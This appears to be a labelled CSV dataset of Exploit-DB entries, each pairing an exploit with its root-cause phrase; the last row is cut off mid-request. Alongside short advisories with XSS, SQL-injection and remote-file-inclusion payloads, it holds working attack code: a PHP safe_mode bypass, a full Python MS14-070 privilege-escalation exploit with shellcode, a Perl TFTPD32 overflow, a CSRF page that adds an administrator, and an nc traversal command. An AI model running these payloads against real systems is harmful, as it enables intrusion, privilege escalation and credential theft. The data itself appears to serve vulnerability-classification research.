28002,KAPhotoservice 7.5 - 'album.asp?cat' Cross-Site Scripting source: https://www.securityfocus.com/bid/18379/info  KAPhotoservice is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  These issues affect version 7.5; earlier versions may also be vulnerable.  http://www.example.com/album.asp?cat=[XSS]&albumid=1,fails to properly sanitize user-supplied input,1
25040,"PHP 4.x/5.0 Shared Memory Module - Offset Memory Corruption source: https://www.securityfocus.com/bid/12045/info  PHP shared memory module (shmop) is reported prone to an integer handling vulnerability. The issue exists in the PHP_FUNCTION(shmop_write) function and is as a result of a lack of sufficient sanitization performed on 'offset' data.  This vulnerability may be exploited to make an almost arbitrary write into process memory. It is reported that the vulnerability may be leveraged to disable PHP 'safe mode', this may result in further compromise in a shared-server environment.   <? /*    Php Safe_mode Bypass Proof of concept.        Copyright 2004 Stefano Di Paola stefano.dipaola[at]wisec.it        Disclaimer: The author is not responsible of any damage this script can cause     */   $shm_id = shmop_open(0xff2, ""c"", 0644, 100);   if (!$shm_id) {     echo ""Couldn't create shared memory segment\n"";     die;  }  // $data=""\x01""; // the new value for safe_mode  $data=""\x00"";   // this (-3842685) is my offset to reach core_globals.safe_mode // taken with gdb. (0x40688d83)  $offset=-3842685; // Lets write the new value at our offset. $shm_bytes_written = shmop_write($shm_id, $data, $offset ); if ($shm_bytes_written != strlen($data)) {    echo ""Couldn't write the entire length of data\n""; }  //Now lets delete the block and close the shared memory segment if (!shmop_delete($shm_id)) {    echo ""Couldn't mark shared memory block for deletion.""; } shmop_close($shm_id);  // Let's try if safe mode has been set to off echo passthru(""id""); dl(""shmop.so""); ?>",a lack of sufficient sanitization performed on 'offset' data,1
35936,"Microsoft Windows Server 2003 SP2 - Local Privilege Escalation (MS14-070) """""" KL-001-2015-001 : Microsoft Windows Server 2003 SP2 Arbitrary Write Privilege Escalation  Title: Microsoft Windows Server 2003 SP2 Arbitrary Write Privilege Escalation Advisory ID: KL-001-2015-001 Publication Date: 2015.01.28 Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2015-001.txt  1. Vulnerability Details       Affected Vendor: Microsoft      Affected Product: TCP/IP Protocol Driver      Affected Version: 5.2.3790.4573      Platform: Microsoft Windows Server 2003 Service Pack 2      Architecture: x86, x64, Itanium      Impact: Privilege Escalation      Attack vector: IOCTL      CVE-ID: CVE-2014-4076  2. Vulnerability Description       The tcpip.sys driver fails to sufficiently validate memory      objects used during the processing of a user-provided IOCTL.  3. Technical Description       By crafting an input buffer that will be passed to the Tcp      device through the NtDeviceIoControlFile() function, it      is possible to trigger a vulnerability that would allow an      attacker to elevate privileges.       This vulnerability was discovered while fuzzing the tcpip.sys      driver. A collection of IOCTLs that could be targeted was      obtained and subsequently fuzzed. During this process, one of      the crashes obtained originated from the IOCTL 0x00120028.      This was performed on an x86 installation of Windows Server      2003, Service Pack 2.       ErrCode = 00000000      eax=00000000 ebx=859ef888 ecx=00000008 edx=00000100 esi=00000000 edi=80a58270      eip=f67ebbbd esp=f620a9c8 ebp=f620a9dc iopl=0         nv up ei pl zr na pe nc      cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246      tcpip!SetAddrOptions+0x1d:      f67ebbbd 8b5e28          mov     ebx,dword ptr [esi+28h] ds:0023:00000028=????????       A second chance exception has occurred during a mov      instruction. This instruction is attempting to copy a pointer      value from an un-allocated address space. Since no pointer      can be found, an exception is generated.       Let's begin by reviewing the call stack:       kd> kv      *** Stack trace for last set context - .thread/.cxr resets it      ChildEBP RetAddr  Args to Child                    f620a9dc f67e416b f620aa34 00000022 00000004 tcpip!SetAddrOptions+0x1d (FPO: [Non-Fpo])      f620aa10 f67e40de f620aa34 859ef888 859ef8a0 tcpip!TdiSetInformationEx+0x539 (FPO: [Non-Fpo])      f620aa44 f67e3b24 85a733d0 85a73440 85a73440 tcpip!TCPSetInformationEx+0x8c (FPO: [Non-Fpo])      f620aa60 f67e3b51 85a733d0 85a73440 85a733d0 tcpip!TCPDispatchDeviceControl+0x149 (FPO: [Non-Fpo])      f620aa98 8081d7d3 85c4b410 85a733d0 85e82390 tcpip!TCPDispatch+0xf9 (FPO: [Non-Fpo])      f620aaac 808ef85d 85a73440 85e82390 85a733d0 nt!IofCallDriver+0x45 (FPO: [Non-Fpo])      f620aac0 808f05ff 85c4b410 85a733d0 85e82390 nt!IopSynchronousServiceTail+0x10b (FPO: [Non-Fpo])      f620ab5c 808e912e 000006f4 00000000 00000000 nt!IopXxxControlFile+0x5e5 (FPO: [Non-Fpo])      f620ab90 f55c10fa 000006f4 00000000 00000000 nt!NtDeviceIoControlFile+0x2a (FPO: [Non-Fpo])       The nt!NtDeviceIoControlFile() function was called, creating      a chain of subsequent function calls that eventually led to      the tcpip!SetAddrOptions() function being called.       By de-constructing the call to nt!NtDeviceIoControlFile() we      can derive all required information to re-create this exception.       0a b940dd34 80885614 nt!NtDeviceIoControlFile+0x2a      eax=00000000 ebx=8c785070 ecx=00000000 edx=00000000 esi=00000000 edi=00000000      eip=808e912e esp=b940dd08 ebp=b940dd34 iopl=0         nv up ei pl zr na pe nc      cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246      nt!NtDeviceIoControlFile+0x2a:      808e912e 5d              pop     ebp      kd> db [ebp+2C] L?0x4      b940dd60  00 00 00 00                                      ....      kd> db [ebp+28] L?0x4      b940dd5c  00 00 00 00                                      ....      kd> db [ebp+24] L?0x4      b940dd58  20 00 00 00                                       ...      kd> db [ebp+20] L?0x4      b940dd54  00 11 00 00                                      ....      kd> db [ebp+1c] L?0x4      b940dd50  28 00 12 00                                      (...      kd> db [ebp+18] L?0x4      b940dd4c  58 4f bd 00                                      XO..      kd> db [ebp+14] L?0x4      b940dd48  00 00 00 00                                      ....      kd> db [ebp+10] L?0x4      b940dd44  00 00 00 00                                      ....      kd> db [ebp+0c] L?0x4      b940dd40  00 00 00 00                                      ....      kd> db [ebp+8] L?0x4      b940dd3c  b8 06 00 00                                      ....       The inputBuffer for this call references memory at 0x1000 with      a length of 0x20.       kd> db 0x1100 L?0x20      00001100  00 04 00 00 00 00 00 00-00 02 00 00 00 02 00 00  ................      00001110  22 00 00 00 04 00 00 00-00 00 01 00 00 00 00 00  ""...............       After review of the tcpip.sys driver, some memory trickery      was created to control the code flow until the instruction      pointer could be controlled in a way that would be beneficial      to an attacker.       kd> db 0x28 L?0x11      00000028  87 ff ff 38 00 00 00 00-00 00 00 00 00 00 00 00  ...8............      00000038  01        eax=00000000 ebx=80a58290 ecx=00000000 edx=00000000 esi=00000000 edi=00000000      eip=0000002a esp=b940db3c ebp=b940db60 iopl=0         nv up ei pl zr na pe nc      cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246      0000002a ff              ???       Since the instruction pointer now contains 0x0000002a,      exploitation becomes trivial. Merely allocating the desired      payload for execution at this memory address will allow for      unprivileged users to run their payload within a privileged      process.  4. Mitigation and Remediation Recommendation       The vendor has issued a patch for this      vulnerability, the details of which are presented      in the vendor's public acknowledgment MS14-070      (https://technet.microsoft.com/library/security/MS14-070).  5. Credit       This vulnerability was discovered by Matt Bergin of KoreLogic      Security, Inc.  6. Disclosure Timeline       2014.04.28 - Initial contact; sent Microsoft report and PoC.      2014.04.28 - Microsoft requests PoC.      2014.04.29 - KoreLogic resends PoC from the initial contact                   email.      2014.04.29 - Microsoft acknowledges receipt of vulnerability                   report.      2014.04.29 - Microsoft opens case 19010 (MSRC 0050929) to                   investigate the vulnerability.      2014.04.30 - Microsoft informs KoreLogic that the case is                   actively being investigated.      2014.05.30 - Microsoft informs KoreLogic that the case is                   actively being investigated.      2014.06.11 - KoreLogic informs Microsoft that 30 business days                   have passed since vendor acknowledgment of the                   initial report. KoreLogic requests CVE number for                   the vulnerability, if there is one. KoreLogic                   also requests vendor's public identifier for the                   vulnerability along with the expected disclosure                   date.      2014.06.24 - KoreLogic informs Microsoft that no response was                   received following the 06.11.14 email. KoreLogic                   requests CVE number for the vulnerability, if                   there is one. KoreLogic also requests vendor's                   public identifier for the vulnerability along with                   the expected disclosure date.      2014.06.24 - Microsoft replies to KoreLogic that they have                   reproduced the vulnerability and are determining                   how to proceed with the supplied information.                   They are not able to provide a CVE or an expected                   disclosure date.      2014.07.02 - 45 business days have elapsed since Microsoft                   acknowledged receipt of the vulnerability report                   and PoC.      2014.07.17 - KoreLogic requests CVE number for the                   vulnerability. KoreLogic also requests vendor's                   public identifier for the vulnerability along with                   the expected disclosure date.      2014.08.18 - Microsoft notifies KoreLogic that they have a CVE                   but are not willing to share it with KoreLogic at                   this time.      2014.09.08 - KoreLogic requests CVE number for the                   vulnerability. KoreLogic also requests vendor's                   public identifier for the vulnerability along with                   the expected disclosure date.      2014.09.11 - Microsoft responds saying that the vulnerability                   is expected to be disclosed in ""a Fall release""                   and that ""it is currently looking good for                   October."" Does not provide CVE.      2014.09.24 - Microsoft informs KoreLogic that there was a                   packaging issue and that the patch will be pushed                   to November.      2014.11.03 - Microsoft confirms the patch will ship in November.      2014.11.11 - Vulnerability publicly disclosed by Microsoft as                   issue MS14-070 with CVE-2014-4076.      2015.01.28 - KoreLogic releases advisory.  7. Exploit """"""       #!/usr/bin/python2      #      # KL-001-2015-001 / MS14-070 / CVE-2014-4076      # Microsoft Windows Server 2003 x86 Tcpip.sys Privilege Escalation      # Matt Bergin @ KoreLogic / Level @ Smash the Stack      # shout out to bla      #       from optparse import OptionParser      from subprocess import Popen      from os.path import exists      from struct import pack      from time import sleep      from ctypes import *      from sys import exit       CreateFileA,NtAllocateVirtualMemory,WriteProcessMemory =  windll.kernel32.CreateFileA,windll.ntdll.NtAllocateVirtualMemory,windll.kernel32.WriteProcessMemory      DeviceIoControlFile,CloseHandle = windll.ntdll.ZwDeviceIoControlFile,windll.kernel32.CloseHandle      INVALID_HANDLE_VALUE,FILE_SHARE_READ,FILE_SHARE_WRITE,OPEN_EXISTING,NULL = -1,2,1,3,0       def spawn_process(path):          process = Popen([path],shell=True)          pid = process.pid          return       def main():          print ""CVE-2014-4076 x86 exploit, Level\n""          global pid, process          parser = OptionParser()          parser.add_option(""--path"",dest=""path"",help=""path of process to start and elevate"")          parser.add_option(""--pid"",dest=""pid"",help=""pid of running process to elevate"")          o,a = parser.parse_args()          if (o.path == None and o.pid == None):              print ""[!] no path or pid set""              exit(1)          else:              if (o.path != None):            if (exists(o.path) != True):          print ""[!] path does not exist""          exit(1)            else:                    Thread(target=spawn_process,args=(o.path),name='attacker-cmd').start()              if (o.pid != None):                  try:                      pid = int(o.pid)                  except:                      print ""[!] could not convert PID to an interger.""                      exit(1)          while True:                  if (""pid"" not in globals()):                      sleep(1)                  else:                      print ""[+] caught attacker cmd at %s, elevating now"" % (pid)                      break          buf =  ""\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x22\x00\x00\x00\x04\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00""          sc =  ""\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x38\x50\xBB\x04\x00\x00\x00\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75\xED\x8B\xB8\xD8\x00\x00\x00\x83\xE7\xF8\x58\xBB\x41\x41\x41\x41\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75\xED\x89\xB8\xD8\x00\x00\x00\x61\xBA\x11\x11\x11\x11\xB9\x22\x22\x22\x22\xB8\x3B\x00\x00\x00\x8E\xE0\x0F\x35\x00""          sc = sc.replace(""\x41\x41\x41\x41"",pack('<L',pid))          sc = sc.replace(""\x11\x11\x11\x11"",""\x39\xff\xa2\xba"")          sc = sc.replace(""\x22\x22\x22\x22"",""\x00\x00\x00\x00"")                     handle = CreateFileA(""\\\\.\\Tcp"",FILE_SHARE_WRITE|FILE_SHARE_READ,0,None,OPEN_EXISTING,0,None)          if (handle == -1):              print ""[!] could not open handle into the Tcp device""              exit(1)          print ""[+] allocating memory""                        ret_one = NtAllocateVirtualMemory(-1,byref(c_int(0x1000)),0x0,byref(c_int(0x4000)),0x1000|0x2000,0x40)          if (ret_one != 0):              print ""[!] could not allocate memory...""              exit(1)          print ""[+] writing relevant memory...""          ret_two = WriteProcessMemory(-1, 0x28, ""\x87\xff\xff\x38"", 4, byref(c_int(0)))          ret_three = WriteProcessMemory(-1, 0x38, ""\x00""*2, 2, byref(c_int(0)))          ret_four = WriteProcessMemory(-1, 0x1100, buf, len(buf), byref(c_int(0)))          ret_five = WriteProcessMemory(-1, 0x2b, ""\x00""*2, 2, byref(c_int(0)))          ret_six = WriteProcessMemory(-1, 0x2000, sc, len(sc), byref(c_int(0)))          print ""[+] attack setup done, crane kick!""          DeviceIoControlFile(handle,NULL,NULL,NULL,byref(c_ulong(8)),0x00120028,0x1100,len(buf),0x0,0x0)          CloseHandle(handle)          exit(0)       if __name__==""__main__"":          main()  """""" The contents of this advisory are copyright(c) 2015 KoreLogic, Inc. and are licensed under a Creative Commons Attribution Share-Alike 4.0 (United States) License: http://creativecommons.org/licenses/by-sa/4.0/  KoreLogic, Inc. is a founder-owned and operated company with a proven track record of providing security services to entities ranging from Fortune 500 to small and mid-sized companies. We are a highly skilled team of senior security consultants doing by-hand security assessments for the most important networks in the U.S. and around the world. We are also developers of various tools and resources aimed at helping the security community. https://www.korelogic.com/about-korelogic.html  Our public vulnerability disclosure policy is available at: https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v1.0.txt """"""",fails to sufficiently validate memory objects used during the processing of a user-provided IOCTL. 3,1
27356,"CutePHP CuteNews 1.4.1 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/16961/info  CuteNews is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before including it in dynamically generated HTML content.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  CuteNews version 1.4.1 is vulnerable to this issue; other versions may also be affected.  http://www.example.com/index.php?subaction=showcomments&id=[number]&archive=&start_from=&ucat=&"">[code]",a failure in the application to properly sanitize user-supplied input before including it in dynamically generated HTML content,1
25557,"HP OpenView Radia Management Portal 1.0/2.0 - Remote Command Execution source: https://www.securityfocus.com/bid/13414/info  A remote command execution vulnerability affects HP OpenView Radia Management Portal. This issue is due to a failure of the application to properly secure access to critical functionality. This is due to a directory traversal issue that will permit a remote user to execute any program on the affected computer.  An unauthenticated, remote attacker may leverage this issue to execute arbitrary commands on an affected computer with Local System privileges on the Microsoft Windows platform and elevated privileges on UNIX-based platforms.   bash$ printf ""\x00\x00\x00../../windows/system32/whoami.exe\x00"" | nc -v xx.xx.xx.xx 1065",a failure of the application to properly secure access to critical functionality,1
18886,"Axous 1.1.1 - Cross-Site Request Forgery / Persistent Cross-Site Scripting +-----------------------------------------------------------------------------------------------------------+ # Exploit Title     : Axous 1.1.1 Multiple Vulnerabilities (CSRF - Persistent XSS)  # Date              : 30-04-2012 # Author            : Ivano Binetti (http://www.ivanobinetti.com) # Software link     : http://www.axous.com/get.php?pid=1 # Vendor site       : http://www.axous.com/ # Version           : 1.1.1 (and lower) # Tested on         : Debian Squeeze (6.0)  # CVE               : CVE-2012-2629 # Original Advisory : http://www.webapp-security.com/2012/05/axous-1-1-1-multiple-vulnerabilities-csrf-persistent-xss/ +-----------------------------------------------------------------------------------------------------------+  Summary  1)Introduction 2)Vulnerabilities Description   2.1 CSRF   2.2 Persistent XSS 3)Exploit  3.1 Exploit  CSRF (Add admin)  3.2 Exploit Persistent XSS   3.2.1 Exploit ""page_title""   3.2.2 Exploit ""category_name[1]""   3.2.3 Exploit ""site_name"", ""seo_title"" and ""meta_keywords""   3.2.4 Exploit ""company_name"", ""address1"", ""address2"", ""city"", ""state"", ""country"", ""author_first_name"", ""author_last_name"", ""author_email"", etc   3.2.5 Exploit ""system_email"", ""sender_name"", ""smtp_server"", ""smtp_username"", ""smtp_password"", ""order_notice_email"" +-----------------------------------------------------------------------------------------------------------+ 1)Introduction Axous ""is an e-shop system for software venders. With Axous, you can setup a professional software site, start selling your product with PayPal  ExpressCheckout, and send regcode to your customers automaticly in 5 minutes"".   2)Vulnerability Description   2.1 CSRF  Axous 1.1.1 (And below) suffers from multiple CSRF vulnerabilities which could allow an attacker to change any parameters when an authenticated   user/admin browses a special crafted web page.   In this Advisory I will only demonstrate how to add a new administrator but, with little modifications to my exploit, you can modify any Axous's   parameters, as Axous does not use an anti-CSRF token.    2.2 Persistent XSS   Axous 1.1.1 (and below) is prone to multiple persistent XSS vulnerabilities due to an improper input sanitization of the following parameters:   - ""page_title"" passed to server side logic (path: ""admin/content_pages_edit.php"") via http POST method.  Exploiting ""page_title"" parameter an authenticated administrator could insert arbitrary code in ""Title"" field, and execute it   when another administrator clicks on ""Pages"" link or on that specific pages under ""Title"" menu.  Furthermore injected code will generate a persistent XSS for all unauthenticated users visiting that web page.   - ""category_name[1]"" passed to server side logic (path:""admin/products_category.php"") via http POST method.  Exploiting ""category_name[1]"" parameter an administrator could insert arbitrary code in ""Category"" field (under ""Control Panel > Products"")  and create a persistent XSS for another administrator who clicks on the ""Add New"" button (always under ""Control Panel > Products"").   -""site_name"", ""seo_title"" and ""meta_keywords"" parameters passed to ""admin/settings_siteinfo.php"" script via http POST method.  Exploiting these parameters an authenticated administrator could insert arbitrary code and create a persistent XSS for another administrator   who clicks ""Site info"" link under Settings menu.    - ""company_name"", ""address1"", ""address2"", ""city"", ""state"", ""country"", ""author_first_name"", ""author_last_name"", ""author_email"", ""contact_first_name"",   ""contact_last_name"", ""contact_email"", ""general_email"", ""general_phone"", ""general_fax"", ""sales_email"", ""sales_phone"", ""support_email"", ""support_phone""   passed to ""admin/settings_company.php"" script via http POST method.  Exploiting these parameters an authenticated administrator could insert arbitrary code and create a persistent XSS for another administrator   who visits that injected menu.   - ""system_email"", ""sender_name"", ""smtp_server"", ""smtp_username"", ""smtp_password"", ""order_notice_email"" parameters passed to   ""admin/settings_email.php"" via httl POSt method.  Exploiting these parameters an authenticated administrator could insert arbitrary code and create a persistent XSS for another administrator   who clicks ""Site info"" link under Settings menu.   Other parameters could be injected!     3)Exploit   3.1 Exploit CSRF (Add admin)  <html>    <body onload=""javascript:document.forms[0].submit()"">  <form method=""POST"" name=""form0"" action=""http://<ip_address>:80/admin/administrators_add.php"">  <input type=""hidden"" name=""user_name"" value=""newadmin""/>  <input type=""hidden"" name=""new_passwd"" value=""newpassword""/>  <input type=""hidden"" name=""new_passwd1"" value=""newpassword""/>  <input type=""hidden"" name=""email"" value=""newemail@email.com""/>  <input type=""hidden"" name=""dosubmit"" value=""1""/>  <input type=""hidden"" name=""id"" value=""""/>  <input type=""hidden"" name=""action"" value=""addnew""/>  </form>  </body>  </html>    3.2 Exploit Persistent XSS   3.2.1 Exploit ""page_title""    Insert the following code in ""Title"" field under ""Edit page"" section:   Page_Title<script>alert(document.cookie)</script>        3.2.2 Exploit ""category_name[1]""    Insert the following code in ""Category"" field under ""Control Panel > Products"" section:  <script>alert(document.cookie)</script>    3.2.3 Exploit ""site_name"", ""seo_title"" and ""meta_keywords""    Insert the following code in ""Site name"" filed under ""Control Panel > Settings"":   ""/><script>alert(""XSS"")</script>    3.2.4 Exploit ""company_name"", ""address1"", ""address2"", ""city"", ""state"", ""country"", ""author_first_name"", ""author_last_name"", ""author_email"", etc   Insert the following code in all fields under ""Control Panel > Settings > Company info"":   ""/><script>alert(""XSS"")</script>    3.2.5 Exploit ""system_email"", ""sender_name"", ""smtp_server"", ""smtp_username"", ""smtp_password"", ""order_notice_email""    Insert the following code in all fields under ""Control Panel > Settings > E-mail Settings"":   ""/><script>alert(""XSS"")</script> +-----------------------------------------------------------------------------------------------------------+",an improper input sanitization of the following parameters,1
32111,"Pre Survey Generator - 'default.asp' SQL Injection source: https://www.securityfocus.com/bid/30349/info  Pre Survey Generator is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/poll/default.asp?catid=1+union+select+0,password+from+users",fails to sufficiently sanitize user-supplied data,1
22025,"TFTPD32 2.50 - 'Filename' Remote Buffer Overflow source: https://www.securityfocus.com/bid/6199/info  A buffer-overflow vulnerability has been reported for Tftpd32. The vulnerability is due to insufficient checks on user-supplied input.   A remote attacker can exploit this vulnerability by supplying a long string as a name of the file to retrieve. This will trigger the buffer-overflow condition. Any malicious attacker-supplied code will be executed with the privileges of the Tftpd32 process.  #!/usr/bin/perl #TFTP Server remote Buffer Overflow use IO::Socket; $host = ""192.168.1.53""; $port = ""69""; $data = ""A"";  #$buf .= ""\x00\x02""; # Send ---- Choose one $buf .= ""\x00\x01""; # Recieve  $buf .= ""A""; $num = ""116""; $buf .= $data x $num; $buf .= "".""; $num = ""140""; # EIP section $buf .= $data x $num;  $address = ""\xFF\xFF\xFF\xFF""; $buf .= $address;  $egg = ""\xEB\x27\x8B\x34\x24\x33\xC9\x33\xD2\xB2""; $egg .= ""\x0B\x03\xF2\x88\x0E\x2B\xF2\xB8\xAF\xA7""; $egg .= ""\xE6\x77\xB1\x05\xB2\x04\x2B\xE2\x89\x0C""; $egg .= ""\x24\x2B\xE2\x89\x34\x24\xFF\xD0\x90\xEB""; $egg .= ""\xFD\xE8\xD4\xFF\xFF\xFF""; $egg .= ""notepad.exe"";  $egg .= ""\x90\x90\x90\x90\x90\x90""; $buf .= $egg;  $buf .= ""\x00binary\x00"";  $socket = IO::Socket::INET->new(Proto => ""udp"") or die ""Socket error: $@\n""; $ipaddr = inet_aton($host) || $host; $portaddr = sockaddr_in($port, $ipaddr); send($socket, $buf, 0, $portaddr) == length($buf) or die ""Can't send: $!\n""; print ""Now, '$host' should open up a notepad\n"";",insufficient checks on user-supplied input,1
25546,BEA WebLogic Server 8.1 / WebLogic Express Administration Console - Cross-Site Scripting source: https://www.securityfocus.com/bid/13400/info  A remote cross-site scripting vulnerability affects BEA WebLogic Server and WebLogic Express administration console. This issue is due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated Web content.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://example.com:8001/console/actions/jndi/JndiFramesetAction?server='<script>alert(document.cookie);</script>mydomain%3AName%3Dmyserver%2CType%3DS,a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated Web content,1
27905,DoceboLms 2.0.x - 'Lang' Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/18110/info  DoceboLMS is prone to multiple remote file-include vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit these issues to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/DOCEBO205/modules/credits/help.php?lang=http://attacker's site,a failure in the application to properly sanitize user-supplied input,1
17918,"Adobe Photoshop Elements 8.0 - Multiple Arbitrary Code Execution Vulnerabilities Title: ------ Adobe Photoshop Elements 8.0 Multiple Arbitrary Code Execution Vulnerabilities     Vendor: ------- Adobe Systems Inc. (http://www.adobe.com)   Product web page: ----------------- http://www.adobe.com/products/photoshop-elements.html   Affected version: ----------------- 8.0 and 7.0 (20080916r.508356)   Summary: -------- Adobe Photoshop Elements - the No.1 consumer photo editing software that helps you turn everyday memories into sensational photos you'll cherish forever. Easily edit photos and make photo creations using automated options, share photos with your social network, and view photos virtually anywhere you are.   Description: ------------ Photoshop Elements 8 suffers from a buffer overflow vulnerability when dealing with .ABR (brushes) and .GRD (gradients) format files. The application fails to sanitize the user input resulting in a memory corruption, overwriting several memory registers which can aid the atacker to gain the power of executing arbitrary code on the affected system or denial of service scenario.   WinDBG output: -------------------------------------------------------------------- .abr: ----- (cd8.d98): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=0de318d0 ebx=41414141 ecx=06260000 edx=00004141 esi=0de318c8 edi=41414141 eip=7c919064 esp=0012d784 ebp=0012d9a0 iopl=0         nv up ei ng nz na pe cy cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210287 ntdll!RtlDosSearchPath_Ustr+0x473: 7c919064 8b0b            mov     ecx,dword ptr [ebx]  ds:0023:41414141=????????  .grd: ----- (d1c.404): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=7efefefe ebx=00414141 ecx=00104d35 edx=41414141 esi=0f0e0c90 edi=0de5d000 eip=781807f5 esp=0012d9e8 ebp=033052a0 iopl=0         nv up ei pl zr na pe nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246  --------------------------------------------------------------------   Tested on: ---------- Microsoft Windows XP Professional Service Pack 3 (English)   Vulnerability discovered by: ---------------------------- Gjoko 'LiquidWorm' Krstic Zero Science Lab (http://www.zeroscience.mk) liquidworm gmail com   Vendor status: -------------- [22.09.2009] Vulnerabilities discovered. [09.03.2010] Sent detailed info to the vendor with PoC files. [09.03.2010] Vendor responds with assigned tracking numbers of the issues. [21.03.2010] Asked vendor for confirmation. [21.03.2010] Vendor replies confirming the vulnerabilities. [03.06.2011] Asked vendor for scheduled patch release date. [05.06.2011] Vendor replies with a scheduled timeframe. [02.09.2011] Asked vendor for an exact patch release date. [03.09.2011] Vendor replies. [09.09.2011] Asked vendor for assigned advisory ID. [10.09.2011] Vendor tags their Adobe Advisory ID: APSA11-03. [01.10.2011] Coordinated public security advisory released.   Advisory details: ----------------- Advisory ID: ZSL-2011-5049 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5049.php  Adobe Advisory ID: APSA11-03 Adobe Advisory URL: http://www.adobe.com/support/security/advisories/apsa11-03.html Adobe PSIRT ID: 447,448  CVE ID: CVE-2011-2443 CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2443  CWE ID: CWE-120 CWE URL: http://cwe.mitre.org/data/definitions/120.html  REF #1: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4939.php REF #2: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4940.php   Proof Of Concept: ----------------- http://www.zeroscience.mk/codes/brush_gradiently.rar (11071 bytes) https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17918.rar (brush_gradiently.rar)",The application fails to sanitize the user input,1
27546,"SoftBiz Image Gallery - 'images.php?cid' SQL Injection source: https://www.securityfocus.com/bid/17339/info      Softbiz Image Gallery is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.       A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.example.com/imagegallery/images.php?cid=[SQL]",a failure in the application to properly sanitize user-supplied input before using it in an SQL query,1
27424,"DSDownload 1.0 - Multiple SQL Injections source: https://www.securityfocus.com/bid/17116/info  DSDownload is prone to multiple SQL-injection vulnerabilities. The application fails to properly sanitize user-supplied input before using it in SQL queries.  This will allow an attacker to inject arbitrary SQL logic into the vulnerable parameters and scripts. As a result, the attacker may be able to access or modify sensitive information, compromise the application, or even compromise the underlying database. Other attacks are possible.  http://www.example.com/dsdownload/downloads.php? category=999'% 20union%20select% 206,2,3,4,5, 1,7,8/*",The application fails to properly sanitize user-supplied input before using it in SQL queries,1
31104,"AstroSoft HelpDesk - '/operator/article/article_attachment.asp?Attach_Id' Cross-Site Scripting source: https://www.securityfocus.com/bid/27610/info   AstroSoft HelpDesk is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  http://www.example.com/[installdir]/operator/article/article_attachment.asp?Attach_Id=""<script>alert(&#039;DSecRG XSS&#039;)</script>",fails to properly sanitize user-supplied input,1
32708,"Plunet BusinessManager 4.1 - '/pagesUTF8/auftrag_allgemeinauftrag.jsp' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/33153/info  Plunet BusinessManager is prone to multiple security-bypass and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, control how the site is rendered to the user, or perform unauthorized actions as another user; other attacks may also be possible.  Versions prior to BusinessManager 4.2 are vulnerable.  POST /pagesUTF8/auftrag_allgemeinauftrag.jsp HTTP/1.1 Host: <HOSTNAME> or IP User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16)  Gecko/20080718 Ubuntu/8.04 (hardy) Firefox/2.0.0.16 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 300 Proxy-Connection: keep-alive Referer: http://www.example.com/pagesUTF8/auftrag_allgemeinauftrag.jsp Cookie: JSESSIONID=0B1347DFFD031E6BC1944C381A31293D Content-Type: application/x-www-form-urlencoded Content-Length: 1085  TokenUAID=42&QUK=1449&QUKA=*&QUKANSCH=820&QUKLIEFANSCH=820&QUZ=sample& 